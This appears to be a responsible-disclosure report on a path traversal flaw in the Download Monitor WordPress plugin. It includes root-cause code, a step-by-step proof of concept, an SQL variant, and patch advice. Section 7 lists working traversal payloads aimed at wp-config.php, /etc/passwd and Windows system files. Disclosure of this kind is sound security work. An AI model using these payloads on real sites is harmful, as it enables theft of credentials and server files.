# CVE / Wordfence Vulnerability Report

## Download Monitor WordPress Plugin - Path Traversal to Arbitrary File Read

---

### 1. BASIC INFORMATION

| Field | Value |
|-------|-------|
| **Vulnerability Type** | Path Traversal (CWE-22) / Arbitrary File Read (CWE-73) |
| **Plugin** | Download Monitor |
| **Vendor** | WPChill |
| **Version Affected** | 5.2.0 (and all previous versions) |
| **CVSS Score** | 7.2 (High) - AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N |
| **CVE ID** | Requesting assignment |

---

### 2. SUMMARY

The Download Monitor WordPress plugin (by WPChill) contains a path traversal vulnerability in its file handling mechanism. The `FileManager::parse_file_path()` method fails to properly sanitize file paths containing directory traversal sequences (`../`). An authenticated attacker with administrator-level access can create or modify a download entry to point to an arbitrary file on the server filesystem, which is then served to the end user via the plugin's download endpoint.

---

### 3. ROOT CAUSE ANALYSIS

The vulnerability resides in two files:

#### 3.1 `src/FileManager.php` - `parse_file_path()` method (line 87-268)

**Step 1 - Initial file existence check (line 87):**
```php
if ( ( ! isset( $parsed_file_path['scheme'] ) || ! in_array( $parsed_file_path['scheme'], array( 'http', 'https', 'ftp' ) ) ) && isset( $parsed_file_path['path'] ) && file_exists( $parsed_file_path['path'] ) ) {
    $condition_met = true;
    $remote_file = false;
}
```
PHP's `file_exists()` automatically resolves `../` sequences. If a path like `D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../test.txt` is provided, PHP checks if `D:/test.txt` exists. Since it does, `$condition_met = true` is set.

**Step 2 - Allowed paths bypass via strpos() (line 190):**
```php
if ( false !== strpos( $file_path, $path ) ) {
    $allowed_path = true;
    break;
}
```
`strpos()` checks if the target file path **contains** any allowed path string. Since the path includes `D:/phpstudy_pro/WWW/wordpress` as a substring, it passes this check. **However, `strpos()` does not normalize the path first**, so the remaining `../` traversal sequences go undetected.

**Step 3 - The absolute path is returned (line 265):**
```php
return array(
    str_replace( DIRECTORY_SEPARATOR, '/', $file_path ),
    $remote_file,
    $restriction,
);
```
The manipulated path with traversal sequences is returned as-is.

#### 3.2 `src/DownloadHandler.php` - `readfile_chunked()` method (line 1054-1089)

```php
public function readfile_chunked( $file, $retbytes = true, $range = false ) {
    $chunksize = 1 * ( 1024 * 1024 );
    $buffer    = '';
    $cnt       = 0;
    $handle    = fopen( $file, 'rb' );
    // ... reads and outputs file content
}
```
The validated (but malicious) path is passed directly to `fopen()` which reads and serves the file content to the attacker.

---

### 4. VULNERABILITY DETAILS

#### 4.1 The Core Problem

The plugin's file path validation logic uses `strpos()` to check if the target path exists within an allowed directory. The attack works because:

1. The malicious path **begins with** a legitimate allowed path (`D:/phpstudy_pro/WWW/wordpress`)
2. The path then uses **directory traversal sequences** (`/../../../../`) to escape outside the allowed directory
3. Since `strpos()` performs a simple substring match and does **not normalize the path before comparison**, the traversal sequences bypass the security check

#### 4.2 Attack Vector

| Prerequisite | Value |
|-------------|-------|
| Authentication | Required (Administrator) |
| Attack Surface | Admin panel - Download creation/editing |
| Network | Remote HTTP request |
| Complexity | Low |

#### 4.3 Impact

- Read `wp-config.php` (database credentials, salts, authentication keys)
- Read server configuration files (`.htaccess`, `web.config`, `php.ini`)
- Read system files (`/etc/passwd`, `C:\Windows\win.ini`, hosts file)
- Access database backup files
- Potentially gain further access to internal network resources

---

### 5. PROOF OF CONCEPT (PoC)

#### 5.1 Prerequisites

- WordPress administrator account
- Download Monitor plugin installed and activated (version 5.2.0)

#### 5.2 Target Environment

- WordPress installation path: `D:\phpstudy_pro\WWW\wordpress`
- Test file created at: `D:\test.txt` (content: `test_content_for_validation`)

#### 5.3 Step-by-Step Exploitation

**Step 1:** Create the test file
```bash
echo test_content_for_validation > D:\test.txt
```

**Step 2:** As an administrator, navigate to:

```
WordPress Admin > Download Monitor > Downloads > Add New
```

![test12](C:\Users\zyj\Desktop\test\test3\test12.png)

**Step 3:** In the "Downloadable Files" section, enter the following malicious URL:

```
D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../test.txt
```

![test11](C:\Users\zyj\Desktop\test\test3\test11.png)

![test15](C:\Users\zyj\Desktop\test\test3\test15.png)

**Step 4:** Publish/Save the download entry.

**Step 5:** Access the download URL to trigger the file read:

```
GET http://target-site.com/download/123/?tmstv=1783045540
```

![test13](C:\Users\zyj\Desktop\test\test3\test13.png)

![test16](C:\Users\zyj\Desktop\test\test3\test16.png)

**Step 6:** The server responds with the contents of `D:\test.txt`:

```
test_content_for_validation
```

![test14](C:\Users\zyj\Desktop\test\test3\test14.png)

#### 5.4 Alternative Exploitation via Database (for CI/automation)

```sql
UPDATE wp_postmeta 
SET meta_value = '["D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../test.txt"]'
WHERE meta_key = '_files' AND post_id = <version_id>;
```

#### 5.5 Successful Exploitation Evidence

**Request:**
```
GET /download/123/?tmstv=1783045540 HTTP/1.1
Host: target-site.com
```

**Response Headers:**
```
HTTP/1.1 200 OK
Content-Disposition: attachment; filename*=UTF-8''test.txt;
Content-Type: application/octet-stream
Content-Length: 27
X-DLM-Filesize: 27
```

**Response Body:**
```
test_content_for_validation
```

---

### 6. AFFECTED CODE (Detailed)

#### File: `wp-content/plugins/download-monitor/src/FileManager.php`

```php
// Line 87 - file_exists() resolves ../ before security check
if ( ( ! isset( $parsed_file_path['scheme'] ) || ! in_array( $parsed_file_path['scheme'], array( 'http', 'https', 'ftp' ) ) ) && isset( $parsed_file_path['path'] ) && file_exists( $parsed_file_path['path'] ) ) {
    $condition_met = true;
    $remote_file = false;
}

// Line 190 - strpos() does not normalize path
if ( false !== strpos( $file_path, $path ) ) {
    $allowed_path = true;
    break;
}
```

#### File: `wp-content/plugins/download-monitor/src/DownloadHandler.php`

```php
// Line 1062 - fopen() reads the malicious path directly
$handle = fopen( $file, 'rb' );
```

---

### 7. ADDITIONAL EXPLOIT PATHS

#### 7.1 Read WordPress Configuration (wp-config.php)
```
D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../phpstudy_pro/WWW/wordpress/wp-config.php
```

#### 7.2 Read System Hosts File (Windows)
```
D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../Windows/System32/drivers/etc/hosts
```

#### 7.3 Read Windows System File
```
D:/phpstudy_pro/WWW/wordpress/cookies.txt/../../../../Windows/win.ini
```

#### 7.4 Read Linux System File
```
/var/www/html/wordpress/cookies.txt/../../../../../etc/passwd
```

#### 7.5 Directory Traversal with Different Depths
```
D:/phpstudy_pro/WWW/wordpress/cookies.txt/../cookies.txt/../cookies.txt/../../Windows/win.ini
```

---

### 8. PATCH RECOMMENDATION

#### 8.1 Critical Fix (FileManager.php - `parse_file_path()`)

```php
// NORMALIZE the path using realpath() BEFORE checking allowed_paths
$normalized_path = realpath( $file_path );
if ( false === $normalized_path ) {
    // File doesn't exist on the filesystem
    return array( $file_path, false, true );
}

// Replace the path with its normalized version BEFORE comparing
$file_path = $normalized_path;

// Then check allowed paths using the normalized path
$correct_path = false;
foreach ( $allowed_paths as $allowed_path ) {
    $normalized_allowed = realpath( $allowed_path );
    if ( false !== $normalized_allowed && 0 === strpos( $file_path, $normalized_allowed ) ) {
        $correct_path = $allowed_path;
        break;
    }
}
```

#### 8.2 Additional Security Measures

1. **Block directory traversal sequences** - Reject paths containing `..` after normalization
2. **Validate file type** - After path normalization, verify the file is a regular file (`is_file()`) not a directory or symlink
3. **Sanitize input** - Strip or reject paths with traversal sequences before storage
4. **Add nonce and capability checks** - Ensure all file path modifications require appropriate permissions
5. **Restrict allowed directories** - By default, only allow files within the WordPress uploads directory

---

### 9. REFERENCES

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- CWE-73: External Control of File Name or Path
- Download Monitor Plugin: https://wordpress.org/plugins/download-monitor/

---

### 10. CONTACT INFORMATION

**Security Researcher:** [chengqihong]
**Contact:** [chengqh927@163.com]

---

*This report is intended for responsible disclosure and should only be used on systems you own or have explicit permission to test.*